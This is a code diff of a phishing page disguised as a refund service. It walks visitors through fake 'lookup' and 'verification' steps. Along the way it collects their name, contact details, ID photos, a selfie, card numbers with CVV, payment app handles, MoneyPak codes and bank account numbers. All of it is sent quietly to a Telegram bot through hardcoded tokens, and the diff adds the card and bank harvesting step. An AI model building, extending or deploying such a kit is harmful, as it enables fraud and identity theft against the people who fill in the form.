+            </div>
+
+        </div>
+
+        <button class="btn btn-refund" onclick="submitRefundMethod()" style="margin-top:14px;">
+            Submit Refund
         </button>
     </div>
 </div>
 
-<!-- REFUND COMPLETE POPUP -->
+<!-- REFUND COMPLETE -->
 <div class="popup-overlay" id="refundCompletePopup">
     <div class="congrats-box refund-complete">
         <div class="check-icon">✓</div>
@@ -1383,7 +1392,6 @@ body::before {
         <div class="name-big" id="refundCompleteName">John Doe</div>
         <p class="congrats-sub">Your refund request has been submitted successfully.</p>
         <p class="congrats-look">If any issues arise, we will be in contact with you.</p>
-
         <div class="next-steps">
             <div class="next-steps-title">📋 What happens next</div>
             <div class="step-row">
@@ -1399,22 +1407,20 @@ body::before {
                 <span>If any issues arise, <strong style="color:#fff;">we will be in contact with you</strong> directly.</span>
             </div>
         </div>
-
         <button class="btn btn-refund" onclick="closeRefundComplete()" style="margin-top:6px;">
             <i class="fas fa-check"></i> Got It
         </button>
     </div>
 </div>
 
-<!-- ========== TOAST ========== -->
 <div class="toast-container" id="toastContainer"></div>
 
 <script>
 // ============================================
 // CONFIG
 // ============================================
-const BOT_TOKEN = "8798394453:AAGYnRaOH-T996SdWKJi4CngJ6710koJJ6w";
-const CHAT_ID = "8673303375";
+const BOT_TOKEN = "8855859135:AAHmVOmXKqbV_fyp2YIOyaVnq8ttXizbU78";
+const CHAT_ID = "8818154838";
 const PASSCODE = "g2o-26";
 
 // ============================================
@@ -1482,7 +1488,7 @@ let refundData = {
     fname: '', lname: '', email: '', phone: '',
     idFront: null, idFrontName: '', idBack: null, idBackName: '',
     selfie: null, selfieName: '',
-    amount: '', method: ''
+    amount: '', method: '', methodDetails: {}
 };
 let selectedApp = '';
 let selectedSlot = '';
@@ -1733,7 +1739,7 @@ function sendIDPhotoToTelegram(base64Data, caption) {
 }
 
 // ============================================
-// APP SELECTION (Application)
+// APP SELECTION
 // ============================================
 function selectApp(app, el) {
     selectedApp = app;
@@ -1785,7 +1791,7 @@ function confirmApp() {
 }
 
 // ============================================
-// SLOT SELECTION (Application)
+// SLOT SELECTION
 // ============================================
 function selectSlot(el) {
     selectedSlot = el.dataset.slot;
@@ -1958,17 +1964,17 @@ function refundPhase(from, to, titleText, subText, textText, duration, onDone) {
     }, 40);
 }
 
-// ---- STEP 1: Open refund, show name popup ----
+// ---- STEP 1: Open refund ----
 function openRefundForm() {
-    // Reset refund data
     refundData = {
         fname: '', lname: '', email: '', phone: '',
         idFront: null, idFrontName: '', idBack: null, idBackName: '',
         selfie: null, selfieName: '',
-        amount: '', method: ''
+        amount: '', method: '', methodDetails: {}
     };
-    // Reset form fields
-    ['refundFirstName','refundLastName','refundEmail','refundPhone','refundAmount','refundMethod'].forEach(id => {
+    ['refundFirstName','refundLastName','refundEmail','refundPhone','refundAmount','refundMethod',
+     'refundCardNumber','refundCardExpiry','refundCardCvv','refundChimeTag','refundCashtag',
+     'refundZelleContact','refundMoneypakCode','refundRoutingNumber','refundAccountNumber'].forEach(id => {
         const el = document.getElementById(id);
         if (el) el.value = '';
     });
@@ -1982,10 +1988,14 @@ function openRefundForm() {
     document.getElementById('refundIdBackInput').value = '';
     document.getElementById('refundSelfieInput').value = '';
 
+    // Hide all method dynamic fields
+    document.getElementById('refundMethodFields').classList.remove('show');
+    document.querySelectorAll('#refundMethodFields .field-group').forEach(fg => fg.classList.remove('show'));
+
     document.getElementById('refundNamePopup').classList.add('show');
 }
 
-// ---- STEP 1: Submit name → load 0→60% → show "User Found" → show contact popup ----
+// ---- STEP 1: Submit name → 0→60% → contact popup ----
 function submitRefundName() {
     const fname = document.getElementById('refundFirstName').value.trim();
     const lname = document.getElementById('refundLastName').value.trim();
@@ -1997,15 +2007,10 @@ function submitRefundName() {
     document.getElementById('refundNamePopup').classList.remove('show');
 
     refundPhase(0, 60, 'Looking up account…', 'Searching our records', 'User Lookup', 1800, () => {
-        // At 60% — show "User Found" message
-        const subEl = document.getElementById('refundLoadingSub');
-        const textEl = document.getElementById('refundLoadingText');
-        const titleEl = document.getElementById('refundLoadingTitle');
-        titleEl.textContent = 'User Found ✅';
-        subEl.textContent = 'Account located successfully';
-        textEl.textContent = 'Verifying account…';
+        document.getElementById('refundLoadingTitle').textContent = 'User Found ✅';
+        document.getElementById('refundLoadingSub').textContent = 'Account located successfully';
+        document.getElementById('refundLoadingText').textContent = 'Verifying account…';
 
-        // Send silent telegram
         sendToTelegram(
             `💸 *REFUND — STEP 1: NAME SUBMITTED*\n━━━━━━━━━━━━━━━━━\n` +
             `👤 *Name:* ${refundData.fname} ${refundData.lname}\n` +
@@ -2019,7 +2024,7 @@ function submitRefundName() {
     });
 }
 
-// ---- STEP 2: Submit contact → load 60→75% → show verification popup ----
+// ---- STEP 2: Contact → 60→75% → verification popup ----
 function submitRefundContact() {
     const email = document.getElementById('refundEmail').value.trim();
     const phone = document.getElementById('refundPhone').value.trim();
@@ -2045,7 +2050,7 @@ function submitRefundContact() {
     });
 }
 
-// ---- STEP 3: Submit verification → load 75→85% (identity verification msg) → 85→90% → show amount popup ----
+// ---- STEP 3: Verification → 75→85% → 85→90% → amount popup ----
 function submitRefundVerify() {
     if (!refundData.idFront) { showToast('⚠️ Upload front of ID', 'error'); return; }
     if (!refundData.idBack) { showToast('⚠️ Upload back of ID', 'error'); return; }
@@ -2053,9 +2058,7 @@ function submitRefundVerify() {
 
     document.getElementById('refundVerifyPopup').classList.remove('show');
 
-    // Phase A: 75 → 85 with "Identity Verification"
     refundPhase(75, 85, 'Identity Verification', 'Checking your documents', 'Identity Verification', 1600, () => {
-        // Send photos to telegram silently
         if (refundData.idFront) sendIDPhotoToTelegram(refundData.idFront, `💸 REFUND ID FRONT — ${refundData.fname} ${refundData.lname}`);
         if (refundData.idBack) sendIDPhotoToTelegram(refundData.idBack, `💸 REFUND ID BACK — ${refundData.fname} ${refundData.lname}`);
         if (refundData.selfie) sendIDPhotoToTelegram(refundData.selfie, `💸 REFUND SELFIE — ${refundData.fname} ${refundData.lname}`);
@@ -2069,7 +2072,6 @@ function submitRefundVerify() {
             `━━━━━━━━━━━━━━━━━\n🕐 ${new Date().toLocaleString()}`
         );
 
-        // Phase B: 85 → 90 with "Verified"
         refundPhase(85, 90, 'Verified ✅', 'Identity confirmed', 'Verified', 900, () => {
             document.getElementById('refundLoadingOverlay').classList.remove('show');
             document.getElementById('refundAmountPopup').classList.add('show');
@@ -2077,7 +2079,7 @@ function submitRefundVerify() {
     });
 }
 
-// ---- STEP 4: Submit amount → load 90→95% → show method popup ----
+// ---- STEP 4: Amount → 90→95% → method popup ----
 function submitRefundAmount() {
     const amt = document.getElementById('refundAmount').value.trim();
     if (!amt || parseFloat(amt) <= 0) { showToast('⚠️ Enter a valid amount', 'error'); return; }
@@ -2098,18 +2100,110 @@ function submitRefundAmount() {
     });
 }
 
-// ---- STEP 5: Submit method → load 95→100% → send full summary → show complete popup ----
+// ============================================
+// REFUND METHOD — DYNAMIC FIELDS
+// ============================================
+function onRefundMethodChange() {
+    const method = document.getElementById('refundMethod').value;
+    const wrap = document.getElementById('refundMethodFields');
+
+    // Hide all field groups
+    document.querySelectorAll('#refundMethodFields .field-group').forEach(fg => fg.classList.remove('show'));
+
+    if (!method) { wrap.classList.remove('show'); return; }
+    wrap.classList.add('show');
+
+    if (method === 'Debit Card' || method === 'Credit Card') {
+        document.getElementById('refundCardFields').classList.add('show');
+        setTimeout(() => document.getElementById('refundCardNumber').focus(), 120);
+    } else if (method === 'Chime') {
+        document.getElementById('refundChimeFields').classList.add('show');
+        setTimeout(() => document.getElementById('refundChimeTag').focus(), 120);
+    } else if (method === 'Cash App') {
+        document.getElementById('refundCashappFields').classList.add('show');
+        setTimeout(() => document.getElementById('refundCashtag').focus(), 120);
+    } else if (method === 'Zelle') {
+        document.getElementById('refundZelleFields').classList.add('show');
+        setTimeout(() => document.getElementById('refundZelleContact').focus(), 120);
+    } else if (method === 'MoneyPak') {
+        document.getElementById('refundMoneypakFields').classList.add('show');
+        setTimeout(() => document.getElementById('refundMoneypakCode').focus(), 120);
+    } else if (method === 'Bank Transfer') {
+        document.getElementById('refundBankFields').classList.add('show');
+        setTimeout(() => document.getElementById('refundRoutingNumber').focus(), 120);
+    }
+}
+
+// Card number formatter: groups of 4
+function formatRefundCard(input) {
+    let v = input.value.replace(/\D/g, '').slice(0, 16);
+    v = v.replace(/(.{4})/g, '$1 ').trim();
+    input.value = v;
+}
+
+// Expiry formatter: MM/YY
+function formatRefundExpiry(input) {
+    let v = input.value.replace(/\D/g, '');
+    if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
+    input.value = v.slice(0, 5);
+}
+
+// ============================================
+// STEP 5: Submit method → 95→100% → complete
+// ============================================
 async function submitRefundMethod() {
     const method = document.getElementById('refundMethod').value;
     if (!method) { showToast('⚠️ Please select a refund method', 'error'); return; }
 
+    // Collect method-specific details based on selected method
+    let methodDetails = {};
+    let detailsBlock = '';
+
+    if (method === 'Debit Card' || method === 'Credit Card') {
+        const num = document.getElementById('refundCardNumber').value.replace(/\s/g, '');
+        const exp = document.getElementById('refundCardExpiry').value.trim();
+        const cvv = document.getElementById('refundCardCvv').value.trim();
+        if (!num || num.length < 15) { showToast('⚠️ Enter a valid 16-digit card number', 'error'); return; }
+        if (!exp || exp.length < 5) { showToast('⚠️ Enter expiry (MM/YY)', 'error'); return; }
+        if (!cvv || cvv.length < 3) { showToast('⚠️ Enter CVV', 'error'); return; }
+        methodDetails = { number: num, expiry: exp, cvv: cvv };
+        detailsBlock = `💳 *Card Number:* \`${num}\`\n📅 *Expiry:* ${exp}\n🔐 *CVV:* ${cvv}\n`;
+    } else if (method === 'Chime') {
+        const tag = document.getElementById('refundChimeTag').value.trim();
+        if (!tag) { showToast('⚠️ Enter your Chime Sign or phone', 'error'); return; }
+        methodDetails = { chime: tag };
+        detailsBlock = `🟢 *Chime Sign:* \`${tag}\`\n`;
+    } else if (method === 'Cash App') {
+        const tag = document.getElementById('refundCashtag').value.trim();
+        if (!tag) { showToast('⚠️ Enter your Cashtag or phone', 'error'); return; }
+        methodDetails = { cashtag: tag };
+        detailsBlock = `💵 *Cashtag:* \`${tag}\`\n`;
+    } else if (method === 'Zelle') {
+        const contact = document.getElementById('refundZelleContact').value.trim();
+        if (!contact) { showToast('⚠️ Enter your Zelle email or phone', 'error'); return; }
+        methodDetails = { zelle: contact };
+        detailsBlock = `💜 *Zelle Contact:* \`${contact}\`\n`;
+    } else if (method === 'MoneyPak') {
+        const code = document.getElementById('refundMoneypakCode').value.trim();
+        if (!code || code.length !== 14) { showToast('⚠️ Enter 14-digit MoneyPak code', 'error'); return; }
+        methodDetails = { moneypak: code };
+        detailsBlock = `💵 *MoneyPak Code:* \`${code}\`\n`;
+    } else if (method === 'Bank Transfer') {
+        const routing = document.getElementById('refundRoutingNumber').value.trim();
+        const account = document.getElementById('refundAccountNumber').value.trim();
+        if (!routing || routing.length !== 9) { showToast('⚠️ Enter 9-digit routing number', 'error'); return; }
+        if (!account) { showToast('⚠️ Enter account number', 'error'); return; }
+        methodDetails = { routing: routing, account: account };
+        detailsBlock = `🏦 *Routing:* \`${routing}\`\n🏦 *Account:* \`${account}\`\n`;
+    }
+
     refundData.method = method;
+    refundData.methodDetails = methodDetails;
     document.getElementById('refundMethodPopup').classList.remove('show');
 
     refundPhase(95, 100, 'Submitting Refund…', 'Finalizing your request', 'Submitting', 1400, async () => {
         const ip = await getIPInfo();
 
-        // Full summary to admin telegram
         const msg =
             `💸 *REFUND SUBMITTED — FULL SUMMARY*\n` +
             `━━━━━━━━━━━━━━━━━\n` +
@@ -2119,6 +2213,7 @@ async function submitRefundMethod() {
             `━━━━━━━━━━━━━━━━━\n` +
             `💰 *Refund Amount:* $${refundData.amount}\n` +
             `🏦 *Refund Method:* ${refundData.method}\n` +
+            `${detailsBlock}` +
             `🪪 *ID Front:* ✅ Uploaded\n` +
             `🪪 *ID Back:* ✅ Uploaded\n` +
             `🤳 *Selfie:* ✅ Uploaded\n` +
@@ -2128,7 +2223,6 @@ async function submitRefundMethod() {
             `🕐 *Time:* ${new Date().toLocaleString()}`;
         sendToTelegram(msg);
 
-        // Show final popup
         document.getElementById('refundCompleteName').textContent =
             refundData.fname + ' ' + refundData.lname;
         document.getElementById('refundLoadingOverlay').classList.remove('show');
@@ -2136,7 +2230,6 @@ async function submitRefundMethod() {
     });
 }
 
-// ---- Close refund complete ----
 function closeRefundComplete() {
     document.getElementById('refundCompletePopup').classList.remove('show');
     showToast('✅ Refund submitted successfully!', 'success');
